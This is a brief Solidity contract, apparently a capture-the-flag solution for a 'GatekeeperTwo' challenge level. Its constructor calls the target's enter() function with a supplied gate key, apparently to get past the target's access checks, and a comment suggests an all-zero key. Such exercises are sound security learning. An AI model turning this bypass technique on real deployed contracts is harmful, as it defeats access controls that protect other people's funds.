// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./14-gatekeeper-2.sol";

contract Attack14 {
    address public entrant;
    GatekeeperTwo public target;

    constructor(address _targetAddress, bytes8 _gateKey) {
        target = GatekeeperTwo(_targetAddress);
        // call attack() from here - gateKey = "0000000000000000"
        target.enter(_gateKey);
    }

    // function attack() external {}
}
